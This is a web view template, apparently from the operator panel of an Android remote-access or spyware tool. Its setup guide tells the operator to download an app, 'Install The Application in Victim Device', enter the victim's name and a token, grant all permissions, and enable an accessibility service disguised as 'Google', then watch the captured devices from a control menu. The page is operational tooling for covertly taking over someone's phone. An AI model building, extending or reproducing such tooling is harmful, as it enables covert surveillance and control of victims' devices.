<div>

    @if (session()->has('message'))

        <div class="alert alert-success">

            {{ session('message') }}

        </div>

    @endif

    <div class="card-body">
        <div class="card card-outline card-primary">
            <div class="card-header">
              <h3 class="card-title">DOWNLOAD THE APPLICATION</h3>
        
              <div class="card-tools">
                <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
                </button>
              </div>
              <!-- /.card-tools -->
            </div>
            <!-- /.card-header -->
            <div class="card-body">
                <button type="button" class="btn btn-block btn-outline-primary btn-flat" wire:click="download">CLICK HERE</button> 
                <ul>
                  <li>Install The Application in Victim Device</li>
                </ul>
            </div>
            <!-- /.card-body -->
          </div>
        
    </div>
    <div class="card-body">
      <div class="card card-outline card-primary">
          <div class="card-header">
            <h3 class="card-title">STEP 1</h3>
      
            <div class="card-tools">
              <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
              </button>
            </div>
            <!-- /.card-tools -->
          </div>
          <!-- /.card-header -->
          <div class="card-body">
            <ul>
              <li>Enter the Victim Name and The Token</li>
              <li>Make Sure to cross check the token to be 100% right</li>
              <li>PRESS STEP 1 AND ENABLE ALL PERMISSIONS</li>
            </ul>
            
            
          </div>
          <!-- /.card-body -->
        </div>
    </div>
  <div class="card-body">
    <div class="card card-outline card-primary">
        <div class="card-header">
          <h3 class="card-title">STEP 2</h3>
    
          <div class="card-tools">
            <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
            </button>
          </div>
          <!-- /.card-tools -->
        </div>
        <!-- /.card-header -->
        <div class="card-body">
          <ul>
            <li>PRESS 2 and ENABLE "Google" in Accessibility</li>
          </ul>
        </div>
        <!-- /.card-body -->
      </div>  
  </div>
  <div class="card-body">
    <div class="card card-outline card-primary">
        <div class="card-header">
          <h3 class="card-title">STEP 3</h3>
    
          <div class="card-tools">
            <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
            </button>
          </div>
          <!-- /.card-tools -->
        </div>
        <!-- /.card-header -->
        <div class="card-body">
          <ul>
            <li>PRESS STEP 3 button to finialize the SetUp</li>
            <li>SIT BACK AND WATCH THE MAGIC HAPPEN</li>
            <li>CHECK YOUR DEVICES BY SELECTING THE DEVICES IN MENU IN THE CONTROL MENU</li>
          </ul>
             
        </div>
        <!-- /.card-body -->
      </div>  
    </div>
</div>
